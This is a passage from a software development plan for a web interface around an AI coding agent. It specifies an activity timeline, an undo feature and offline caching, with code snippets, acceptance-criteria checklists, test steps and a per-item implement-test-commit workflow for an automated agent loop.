
1. **Database** — add activity_events table in `db.js`:
```javascript
db.exec(`
  CREATE TABLE IF NOT EXISTS activity_events (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    session_id TEXT REFERENCES sessions(id),
    event_type TEXT NOT NULL,
    tool TEXT,
    input_summary TEXT,
    created_at INTEGER DEFAULT (unixepoch())
  );
  CREATE INDEX IF NOT EXISTS idx_activity_session ON activity_events(session_id);
`);
```

2. **Server** — save events in the tool hooks (`ws-handler-washmen.js`):
```javascript
// In PreToolUse hook (around line 380):
db.prepare("INSERT INTO activity_events (session_id, event_type, tool, input_summary) VALUES (?, ?, ?, ?)")
  .run(currentSessionId, "tool_start", toolName, JSON.stringify(toolInput).slice(0, 200));

// In PostToolUse hook:
db.prepare("INSERT INTO activity_events (session_id, event_type, tool) VALUES (?, ?, ?)")
  .run(currentSessionId, "tool_end", toolName);
```

3. **API** — add endpoint in `server-washmen.js`:
```javascript
app.get("/api/sessions/:id/timeline", (req, res) => {
  const events = getDb().prepare(
    "SELECT event_type, tool, input_summary, created_at FROM activity_events WHERE session_id = ? ORDER BY created_at ASC"
  ).all(req.params.id);
  res.json(events);
});
```

4. **Frontend** — render timeline in chat, collapsed by default. After each assistant response, show a "View activity" toggle that expands to show the tool sequence:

```javascript
function renderTimeline(events) {
  return events.map(e => {
    const icon = { Bash: '⚙', Edit: '✎', Read: '📄', Glob: '🔍', Grep: '🔍' }[e.tool] || '•';
    return `<span class="timeline-item">${icon} ${e.tool}</span>`;
  }).join(' → ');
}
```

---

### 4.6 Undo Last Turn

**Problem:** No way to revert a bad AI response. User must manually undo file changes.

**Files:**
- `db.js` — add delete function
- `server-washmen.js` — add undo endpoint
- `public/app.js` — add undo button

**Implementation:**

1. **Database** — add function in `db.js`:
```javascript
export function undoLastTurn(sessionId) {
  const lastAssistant = db.prepare(
    "SELECT id FROM messages WHERE session_id = ? AND role = 'assistant' ORDER BY created_at DESC LIMIT 1"
  ).get(sessionId);
  const lastUser = db.prepare(
    "SELECT id FROM messages WHERE session_id = ? AND role = 'user' ORDER BY created_at DESC LIMIT 1"
  ).get(sessionId);

  const ids = [lastAssistant?.id, lastUser?.id].filter(Boolean);
  if (ids.length > 0) {
    db.prepare(`DELETE FROM messages WHERE id IN (${ids.map(() => '?').join(',')})`).run(...ids);
  }
  return ids.length;
}
```

2. **API endpoint** in `server-washmen.js`:
```javascript
app.post("/api/sessions/:id/undo", (req, res) => {
  const deleted = undoLastTurn(req.params.id);
  const messages = getDb().prepare("SELECT * FROM messages WHERE session_id = ? ORDER BY created_at ASC").all(req.params.id);
  res.json({ ok: true, deleted, messages });
});
```

3. **Frontend** — add undo button that appears after each assistant response:
```javascript
// In app.js, after assistant_done handler:
const undoBtn = document.createElement('button');
undoBtn.className = 'undo-btn';
undoBtn.textContent = 'Undo';
undoBtn.onclick = async () => {
  const resp = await fetch(`/api/sessions/${sid}/undo`, { method: 'POST' });
  const data = await resp.json();
  clearChat();
  if (data.messages.length > 0) loadMessages(data.messages);
};
```

CSS:
```css
.undo-btn { background: none; border: 1px solid var(--border); color: var(--text-dim); padding: 2px 10px; border-radius: var(--radius-pill); font-size: 11px; cursor: pointer; margin-top: 4px; }
.undo-btn:hover { border-color: var(--accent); color: var(--text); }
```

**Note:** This only undoes the message history, not file changes the AI made. To fully revert, the user would need to use git (`git checkout -- .`). The undo button could optionally trigger a `git stash` before removing messages.

---

### 4.7 Offline/PWA Completion

**Status:** PWA is already mostly implemented (service worker, manifest, offline page, push notifications).

**Remaining:** The service worker pre-caches only `offline.html` and icons. It should also cache the main app shell.

**File:** `public/sw.js` lines 6-11

**Implementation:**

Update the precache list:
```javascript
const PRECACHE_URLS = [
  "/offline.html",
  "/icons/icon-192.png",
  "/icons/icon-512.png",
  "/styles.css",
  "/app.js",
  "/components/chat.js",
  "/components/preview.js",
  "/components/status.js",
  "/components/budget.js",
];
```

This allows the app shell to load even when the network is briefly unavailable (e.g., during Codespace wake-up).

---

## Acceptance Criteria & Test Plans

### Phase 2 Acceptance Criteria

**2.1 Fix Session Titles:**
- [ ] New sessions have `title` column populated with first 80 chars of user message
- [ ] `/api/workspace` response includes `session.title` for each branch
- [ ] Landing screen displays session title under branch name
- [ ] Existing sessions without titles show branch name as fallback
- [ ] HTML characters in title are escaped (no XSS)

Test: Send a chat message "Build a customer list page with search and filters". Check DB: `SELECT title FROM sessions ORDER BY last_used_at DESC LIMIT 1` — should show the message. Check landing page: branch card should display the title text.

**2.2 Per-Turn Budget Enforcement:**
- [ ] Daily budget check happens after each `addCost()` call, not just at query start
- [ ] When daily budget is exceeded mid-session, user receives a system message
- [ ] SDK `maxBudgetUsd` still enforced per query ($5)
- [ ] Budget message includes current spend and limit

Test: Set `DAILY_BUDGET = 0.01` temporarily. Send two messages. Second message should trigger budget exceeded warning.

**2.3 Process Management & Log Rotation:**
- [ ] Log files are truncated before service restart (not appended indefinitely)
- [ ] `logPositions` object cleans up entries for deleted files
- [ ] `browserConsoleBuffer` capped at 100 entries (was 200)
- [ ] `spawn()` error events logged and broadcast to client
- [ ] No zombie processes after multiple branch switches

Test: Switch branches 3 times. Check `/tmp/*.log` files aren't growing beyond one restart cycle. Check `ps aux | grep node` for orphaned processes.

**2.4 Fix Markdown Streaming Performance:**
- [ ] `requestAnimationFrame` used to batch streaming chunk renders
- [ ] No visible rendering difference to user (text still streams smoothly)
- [ ] Code highlighting and copy buttons still applied correctly
- [ ] Long responses (>5000 chars) render without browser jank
- [ ] Final render (streaming=false) still triggers full parse

Test: Ask AI to "write a 500-line React component". During streaming, open browser DevTools Performance tab. Verify no continuous layout thrashing. Compare with before: should see fewer paint events.

**2.5 Fix Event Listener Leaks in Parallel Mode:**
- [ ] Each pane uses `AbortController` with `{ signal }` on all event listeners
- [ ] `exitParallelMode()` calls `abort()` on each pane's controller
- [ ] Toggle parallel mode on/off 5 times — no increase in memory or listener count
- [ ] Pane functionality (send, stop, keydown, input) works correctly while active

Test: Open DevTools → Memory → Take heap snapshot. Toggle parallel mode 5 times. Take another snapshot. Compare listener counts — should be identical.

**2.6 Eliminate Silent Failures:**
- [ ] All empty `catch {}` blocks replaced with `catch (e) { console.warn(...) }`
- [ ] Priority blocks (lines 192, 204, 266, 305) include descriptive context
- [ ] Server logs show warnings when git operations fail
- [ ] No functional changes — same behavior, just visible logging

Test: Check `journalctl` or server stdout during normal operation. Should see structured `[context]` log entries instead of silence.

---

### Phase 3 Acceptance Criteria

**3.1 Wire Guided Tour to index-v2.html:**
- [ ] Welcome overlay appears on first visit (check localStorage `claudeck-welcome-seen`)
- [ ] "Get Started" button dismisses overlay and shows landing
- [ ] "Take a Tour" button dismisses overlay and starts Driver.js tour
- [ ] Tour highlights correct v2 elements (home-btn, mode-toggle, model-picker, attach-btn, input, send-btn)
- [ ] Tour steps that reference non-existent v2 elements are removed
- [ ] Welcome doesn't appear on subsequent visits (localStorage persisted)
- [ ] Clearing localStorage `claudeck-welcome-seen` brings welcome back

Test: Open incognito browser → navigate to vibe-ui. Welcome overlay should appear. Click "Take a Tour" → tour should highlight real UI elements. Close tour → landing screen shows. Refresh page → welcome should NOT appear again.

**3.2 Add ARIA Labels & Focus Traps:**
- [ ] Status overlay has `role="dialog"` and `aria-modal="true"`
- [ ] Notes overlay has `role="dialog"` and `aria-modal="true"`
- [ ] Chat area has `aria-live="polite"` and `role="log"`
- [ ] `public/js/utils/focus-trap.js` exists and exports `trapFocus()`
- [ ] Tab key cycles within open overlays (doesn't escape to background)
- [ ] Escape closes overlay and returns focus to trigger element
- [ ] Screen reader (VoiceOver) announces new chat messages

Test: Open Status overlay. Press Tab repeatedly — focus should cycle within the overlay. Press Escape — overlay closes. Enable VoiceOver on macOS. Send a message — response should be announced.

**3.3 Consolidate HTML Entry Points:**
- [ ] `index.html` renamed to `index-legacy.html` with deprecation comment
- [ ] `washmen.html` renamed to `washmen-legacy.html` with deprecation comment
- [ ] `/v1` route redirects to `/` (HTTP 302)
- [ ] Main app at `/` still serves `index-v2.html` correctly
- [ ] No broken imports or references to old filenames

Test: `curl -sI http://localhost:4000/v1 | grep Location` should show redirect. Main app should load normally.

**3.4 Preview Error State UI:**
- [ ] After 30 failed health polls, preview shows error message (not blank/spinner)
- [ ] Error state includes "Services not ready" title and description
- [ ] Retry button is visible and functional
- [ ] Clicking Retry restarts the health polling cycle
- [ ] When services eventually come up, preview loads correctly
- [ ] CSS for `.preview-error` classes exists in styles.css

Test: Stop the frontend service (`kill $(lsof -ti:3000)`). Switch branches. Preview should show loading, then after 30s show error state with Retry button. Restart frontend. Click Retry → preview loads.

---

### Phase 4 Acceptance Criteria

**4.1 Branch Summary on Landing:**
- [ ] `/api/workspace` response includes `commitCount`, `lastCommitMsg`, `filesChanged` per branch
- [ ] Landing branch cards show commit count and file count
- [ ] Last commit message displayed under branch name (truncated to 100 chars)
- [ ] Branches with 0 commits show no stats (clean display)
- [ ] Remote-only branches show available stats or "remote" label
- [ ] Git commands use sanitized branch names (from 1.1)

Test: Create a branch, make 3 commits changing 5 files. Go Home. Branch card should show "3 commits · 5 files" and the last commit message. New branch with no commits should show no stats.

**4.2 Cost Breakdown Per Branch:**
- [ ] `getBranchCosts()` function exists in `db.js` and returns cost per branch
- [ ] `/api/workspace` response includes `cost` field per branch
- [ ] Landing branch cards show cost (e.g., "$0.42") when > 0
- [ ] Cost is formatted to 2 decimal places
- [ ] Branches with $0 cost show no cost badge
- [ ] Total landing budget still shows correctly

Test: Use a feature branch, send several messages (accumulate cost). Go Home. Branch card should show the accumulated cost. Verify: `SUM(cost)` in landing budget matches individual branch costs.

**4.3 Collaborative Awareness:**
- [ ] `sessions` table has `codespace_id` column
- [ ] `createSession()` accepts and stores `codespaceId` parameter
- [ ] Session creation captures `CODESPACE_NAME` env var (or hostname fallback)
- [ ] `/api/workspace` response includes `session.codespace` per branch
- [ ] Landing branch cards show Codespace name badge when available
- [ ] Different Codespaces create sessions with different `codespace_id` values

Test: On Codespace A, create a session on branch X. On Codespace B, check `/api/workspace` — branch X should show `codespace: "codespace-a-name"`. On Codespace B, create a session on branch Y — should show Codespace B's name.

**4.4 Auto-Generate Branch Notes on Switch:**
- [ ] Switching from `mvp/feature-x` to `mvp/feature-y` auto-generates notes for `feature-x`
- [ ] Notes include git log (commit list) and diff stat (files changed)
- [ ] "Saving branch notes" step appears in switch progress overlay
- [ ] Notes saved to `branch_notes` table with correct branch name
- [ ] Existing manually-written notes are NOT overwritten (only if notes are empty)
- [ ] Switching to the same branch doesn't trigger note generation
- [ ] Note generation failure doesn't block branch switch

Test: Work on feature-x (make commits). Switch to feature-y. Go to feature-x notes overlay — should show auto-generated summary with commits and file changes. Manually edit notes. Switch away and back — manual notes should be preserved.

**4.5 Agent Activity Timeline:**
- [ ] `activity_events` table exists with columns: session_id, event_type, tool, input_summary, created_at
- [ ] PreToolUse hook inserts `tool_start` events
- [ ] PostToolUse hook inserts `tool_end` events
- [ ] `GET /api/sessions/:id/timeline` returns ordered activity events
- [ ] Frontend shows collapsible "View activity" after each assistant response
- [ ] Timeline renders tool icons in sequence (Read → Edit → Bash → etc.)
- [ ] `input_summary` truncated to 200 chars

Test: Send a message that triggers multiple tools (e.g., "Read the package.json and add a test script"). After response, click "View activity". Should show: 📄 Read → ✎ Edit sequence. Check API: `GET /api/sessions/{id}/timeline` returns matching events.

**4.6 Undo Last Turn:**
- [ ] `undoLastTurn()` function exists in `db.js`
- [ ] `POST /api/sessions/:id/undo` endpoint deletes last user+assistant message pair
- [ ] Endpoint returns updated message list
- [ ] Undo button appears in chat UI after each assistant response
- [ ] Clicking Undo removes last exchange from chat and DB
- [ ] Undo on empty chat does nothing (no error)
- [ ] Multiple undos work (can undo several turns)

Test: Send 3 messages. Click Undo — last exchange removed from UI and DB. Click Undo again — second exchange removed. Refresh page, resume branch — only first exchange should load.

**4.7 Offline/PWA Completion:**
- [ ] Service worker pre-caches app shell files (styles.css, app.js, component JS)
- [ ] Going offline shows cached app shell (not browser error)
- [ ] Coming back online resumes normal operation
- [ ] Service worker updates when new version deployed
- [ ] API calls still fail gracefully when offline (not cached)

Test: Load the app. Go offline (DevTools → Network → Offline). Refresh — should show app shell with offline indicator. Go back online — app reconnects.

---

## Execution Order for Claude Loop

Run these in order. Each phase can be a separate loop iteration.

**IMPORTANT:** After implementing each item, run its test script/steps. Do NOT proceed to the next item if tests fail. Fix failures before moving on.

```
Phase 1 (Security):     1.1 → 1.2 → 1.3 → 1.4 → 1.5
Phase 2 (Reliability):  2.1 → 2.2 → 2.3 → 2.4 → 2.5 → 2.6
Phase 3 (UX):           3.1 → 3.2 → 3.3 → 3.4
Phase 4 (Features):     4.1 → 4.2 → 4.3 → 4.4 → 4.5 → 4.6 → 4.7
```

**Per-item workflow:**
1. Read the spec for the item
2. Read all referenced files at the specified line numbers
3. Implement the changes
4. Run the test script (if bash-testable) or verify the acceptance criteria
5. Commit with descriptive message: `[phase.item] Title — description`
6. Push to origin/main
7. Move to next item

**Commit message format:**
```
[1.1] Sanitize shell inputs — add server/sanitize.js, validate branch names and ports
[2.4] Fix markdown streaming — batch renders with requestAnimationFrame
[4.1] Branch summary on landing — show commit count, files changed, last commit message
```
